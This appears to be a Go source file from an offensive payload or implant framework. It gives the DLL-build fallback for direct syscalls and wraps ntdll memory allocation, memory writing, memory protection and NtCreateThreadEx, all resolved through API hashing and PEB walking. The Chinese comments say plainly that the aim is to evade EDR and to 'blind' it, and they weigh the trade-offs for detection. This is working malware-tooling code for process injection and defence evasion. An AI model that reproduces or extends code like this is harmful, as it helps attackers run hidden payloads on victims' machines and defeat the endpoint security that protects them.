//go:build windows && amd64 && shared

package main

import (
	"unsafe"
)

// DLL 载荷（c-shared）专用的直接系统调用替代实现。
//
// 为什么需要它：Go 不允许"使用 cgo 的包"同时带 Go 汇编文件（构建报
// `package using cgo has Go assembly file`），而 DLL 必须走 cgo（-buildmode=c-shared）。
// 因此 `shared` 构建会排除 `directsyscall_windows_amd64.{go,s}`（以及 PEB 汇编），
// 由本文件提供**接口完全一致**的实现：退回 apihash/PEB 遍历解析出的 ntdll 导出调用。
//
// 代价（如实说明）：DLL 载荷里没有"直接系统调用"这条更强的规避路径，EDR 失明等操作
// 走的是 ntdll 导出（可能被 EDR 用户态 hook 看到）。功能不变，静态/行为特征略增。
// 需要直接系统调用时请用 exe/raw 格式。

const currentProcess = ^uintptr(0)

func ntAllocateVirtualMemory(process uintptr, baseAddr, regionSize *uintptr, allocType, protect uint32) uintptr {
	r1, _, _ := resolveAPI("ntdll.dll", "NtAllocateVirtualMemory").Call(process, uintptr(unsafe.Pointer(baseAddr)), 0, uintptr(unsafe.Pointer(regionSize)), uintptr(allocType), uintptr(protect))
	return r1
}

func ntFreeVirtualMemory(process uintptr, baseAddr, regionSize *uintptr, freeType uint32) uintptr {
	r1, _, _ := resolveAPI("ntdll.dll", "NtFreeVirtualMemory").Call(process, uintptr(unsafe.Pointer(baseAddr)), uintptr(unsafe.Pointer(regionSize)), uintptr(freeType))
	return r1
}

func ntProtectVirtualMemory(process uintptr, baseAddr, regionSize *uintptr, newProtect uint32, oldProtect *uint32) uintptr {
	r1, _, _ := resolveAPI("ntdll.dll", "NtProtectVirtualMemory").Call(process, uintptr(unsafe.Pointer(baseAddr)), uintptr(unsafe.Pointer(regionSize)), uintptr(newProtect), uintptr(unsafe.Pointer(oldProtect)))
	return r1
}

func ntWriteVirtualMemory(process, baseAddr, buffer uintptr, size uintptr, bytesWritten *uintptr) uintptr {
	r1, _, _ := resolveAPI("ntdll.dll", "NtWriteVirtualMemory").Call(process, baseAddr, buffer, size, uintptr(unsafe.Pointer(bytesWritten)))
	return r1
}

func ntCreateThreadEx(threadHandle *uintptr, desiredAccess, objAttr, process, startRoutine, argument, createFlags, zeroBits, stackSize, maxStackSize, attributeList uintptr) uintptr {
	r1, _, _ := resolveAPI("ntdll.dll", "NtCreateThreadEx").Call(uintptr(unsafe.Pointer(threadHandle)), desiredAccess, objAttr, process, startRoutine, argument, createFlags, zeroBits, stackSize, maxStackSize, attributeList)
	return r1
}

func ntClose(handle uintptr) uintptr {
	r1, _, _ := resolveAPI("ntdll.dll", "NtClose").Call(handle)
	return r1
}
